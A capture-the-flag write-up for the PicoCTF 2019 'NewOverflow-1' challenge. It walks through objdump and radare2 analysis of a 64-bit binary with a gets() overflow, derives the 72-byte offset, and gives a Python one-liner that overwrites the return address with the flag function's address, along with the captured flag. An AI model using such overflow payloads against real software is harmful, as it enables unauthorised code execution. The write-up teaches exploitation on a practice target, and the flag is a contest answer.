# New-Overflow 1 | PicoCTF2019
## Problem
Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 on the shell server. 

## Solution

### 1. Use objdump to find the address of the flag function
```bash
$ objdump -D vuln
...

0000000000400767 <flag>:
  400767:       55                      push   %rbp
  400768:       48 89 e5                mov    %rsp,%rbp
  40076b:       48 83 ec 50             sub    $0x50,%rsp

...

```

### 2. Do some dynamic analysis
To understand the difference in the x64 binary I need to analyse it dynamically.
```bash
kali@kali:~/Desktop/picoctf/overflow2$ r2 -d vuln
Process with PID 2936 started...
= attach 2936 2936
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
Warning: r_bin_file_hash: file exceeds bin.hashlimit
[0x7f47937f4090]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f47937f4090]> afl
0x00400680    1 42           entry0
0x004006c0    4 42   -> 37   sym.deregister_tm_clones
0x004006f0    4 58   -> 55   sym.register_tm_clones
0x00400730    3 34   -> 29   entry.fini0
0x00400760    1 7            entry.init0
0x004008d0    1 2            sym.__libc_csu_fini
0x004007cc    1 28           sym.vuln
0x00400630    1 6            sym.imp.gets
0x004008d4    1 9            sym._fini
0x00400860    4 101          sym.__libc_csu_init
0x004006b0    1 2            sym._dl_relocate_static_pie
0x004007e8    1 105          main
0x00400650    1 6            sym.imp.setvbuf
0x00400640    1 6            sym.imp.getegid
0x00400600    1 6            sym.imp.setresgid
0x004005f0    1 6            sym.imp.puts
0x00400767    3 101          sym.flag
0x00400660    1 6            sym.imp.fopen
0x00400670    1 6            sym.imp.exit
0x00400620    1 6            sym.imp.fgets
0x00400610    1 6            sym.imp.printf
0x004005c8    3 23           sym._init
[0x7f47937f4090]> pdf @sym.vuln
            ; CALL XREF from main @ 0x400845
┌ 28: sym.vuln ();
│           ; var int64_t var_40h @ rbp-0x40
│           0x004007cc      55             push rbp
│           0x004007cd      4889e5         mov rbp, rsp
│           0x004007d0      4883ec40       sub rsp, 0x40
│           0x004007d4      488d45c0       lea rax, qword [var_40h]
│           0x004007d8      4889c7         mov rdi, rax
│           0x004007db      b800000000     mov eax, 0
│           0x004007e0      e84bfeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004007e5      90             nop
│           0x004007e6      c9             leave
└           0x004007e7      c3             ret
[0x7f47937f4090]> db 0x004007e5
[0x7f47937f4090]> dc
Welcome to 64-bit. Give me a string that gets you the flag: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
hit breakpoint at: 4007e5
[0x818c5000]> dr
rax = 0x7ffd818c5000
rbx = 0x00000000
rcx = 0x7f47937d2980
rdx = 0x00000000
r8 = 0x7ffd818c5000
r9 = 0x00000000
r10 = 0x00000410
r11 = 0x00000246
r12 = 0x00400680
r13 = 0x7ffd818c5150
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x01ec02a1
rdi = 0x7f47937d54d0
rsp = 0x7ffd818c5000
rbp = 0x7ffd818c5040
rip = 0x004007e5
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x004007e5]> pxr 500  @rsp
0x7ffd818c5000 0x6161616161616161   aaaaaaaa @rsp ascii ('a')
0x7ffd818c5008 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5010 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5018 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5020 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5028 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5030 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5038 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5040 0x6161616161616161   aaaaaaaa @rbp ascii ('a')
0x7ffd818c5048 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5050 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5058 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5060 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5068 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5070 0x6161616161616161   aaaaaaaa ascii ('a')
0x7ffd818c5078 0x00007f4793630061   a.c.G... (tline)
0x7ffd818c5080 ..[ null bytes ]..   00000000 
0x7ffd818c5088 0x00007ffd818c5158   XQ...... ([stack]) stack R W 0x7ffd818c550b -->  ([stack]) stack R W 0x53006e6c75762f2e (./vuln) -->  ascii ('.')
0x7ffd818c5090 0x0000000100040000   ........ 4295229440
0x7ffd818c5098 0x00000000004007e8   ..@..... (/home/kali/Desktop/picoctf/overflow2/vuln) 4196328 (.text) sym.main main program R X 'push rbp' 'vuln'
0x7ffd818c50a0 ..[ null bytes ]..   00000000 
0x7ffd818c50a8 0x1daaed8c23f74989   .I.#....
0x7ffd818c50b0 0x0000000000400680   ..@..... (/home/kali/Desktop/picoctf/overflow2/vuln) 4195968 (.text) entry0 program R X 'xor ebp, ebp' 'vuln'
0x7ffd818c50b8 0x00007ffd818c5150   PQ...... ([stack]) stack R W 0x1 -->  1 (.comment)
0x7ffd818c50c0 ..[ null bytes ]..   00000000 
0x7ffd818c50d0 0xe251ee1492374989   .I7...Q.
0x7ffd818c50d8 0xe325cbcba8b14989   .I....%.
0x7ffd818c50e0 ..[ null bytes ]..   00000000 
0x7ffd818c50f8 0x00007ffd818c5168   hQ...... ([stack]) stack R W 0x7ffd818c5512 -->  ([stack]) stack R W 0x622f3d4c4c454853 (SHELL=/bin/bash) -->  ascii ('S')
0x7ffd818c5100 0x00007f479381d190   ....G... (unk0) R W 0x0 -->  0
0x7ffd818c5108 0x00007f4793802469   i$..G... (/usr/lib/x86_64-linux-gnu/ld-2.30.so) library R X 'sub rbx, 8' 'ld-2.30.so'
0x7ffd818c5110 ..[ null bytes ]..   00000000 
0x7ffd818c5120 0x0000000000400680   ..@..... (/home/kali/Desktop/picoctf/overflow2/vuln) 4195968 (.text) entry0 program R X 'xor ebp, ebp' 'vuln'
0x7ffd818c5128 0x00007ffd818c5150   PQ...... ([stack]) stack R W 0x1 -->  1 (.comment)
0x7ffd818c5130 ..[ null bytes ]..   00000000 
0x7ffd818c5138 0x00000000004006aa   ..@..... (/home/kali/Desktop/picoctf/overflow2/vuln) 4196010 (.text) program R X 'hlt' 'vuln'
0x7ffd818c5140 0x00007ffd818c5148   HQ...... ([stack]) stack R W 0x1c -->  28 (.comment)
0x7ffd818c5148 0x000000000000001c   ........ 28 (.comment)
0x7ffd818c5150 0x0000000000000001   ........ @r13 1 (.comment)
0x7ffd818c5158 0x00007ffd818c550b   .U...... ([stack]) stack R W 0x53006e6c75762f2e (./vuln) -->  ascii ('.')
0x7ffd818c5160 ..[ null bytes ]..   00000000 
0x7ffd818c5168 0x00007ffd818c5512   .U...... ([stack]) stack R W 0x622f3d4c4c454853 (SHELL=/bin/bash) -->  ascii ('S')
```
When taking a close look at the stack I can see the base pointer is in amongst the random load of a's I threw in. It looks like the right offset is 64, or at least that is the size of the buffer until we start overwriting stuff like esp. I test this by rerunning the program and providing exactly 64 input characters.
```bash
[0x7f3ee29c7090]> db 0x004007e5
[0x7f3ee29c7090]> dc
Welcome to 64-bit. Give me a string that gets you the flag: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 4007e5
[0x004007e5]> pxr @ rsp
0x7ffcf1e03690 0x4141414141414141   AAAAAAAA @rsp ascii ('A')
0x7ffcf1e03698 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036a0 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036a8 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036b0 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036b8 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036c0 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036c8 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf1e036d0 0x00007ffcf1e03700   .7...... @rbp ([stack]) stack R W 0x400860 -->  (/home/kali/Desktop/picoctf/overflow2/vuln) 4196448 (.text) sym.__libc_csu_init sym.__libc_csu_init program R X 'push r15' 'vuln'
0x7ffcf1e036d8 0x000000000040084a   J.@..... (/home/kali/Desktop/picoctf/overflow2/vuln) 4196426 (.text) main program R X 'mov eax, 0' 'vuln'
0x7ffcf1e036e0 0x00007ffcf1e037e8   .7...... ([stack]) stack R W 0x7ffcf1e0450b -->  ([stack]) stack R W 0x53006e6c75762f2e (./vuln) -->  ascii ('.')
0x7ffcf1e036e8 0x0000000100400680   ..@..... 4299163264
0x7ffcf1e036f0 0x00007ffcf1e037e0   .7...... ([stack]) stack R W 0x1 -->  1 (.comment)
```
In addition to the 64 bytes needed to fill the buffer, another 8 bytes are needed to write past the return address. Once that's written past, the address of the flag function can be written in.

### 3. Construct the exploit
From here it's just a matter of building the exploit and sending it to the binary.
```bash
kali@kali:~/Desktop/picoctf/overflow2$ python -c "print('A' * (64 + 8) + '\x68\x07\x40')" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
'flag.txt' missing in the current directory!
```

### 4. Run it on the server to win
```bash
jib1337@pico-2019-shell1:/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123$ python -c "print('A' * (64 + 8) + '\x68\x07\x40')" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}
```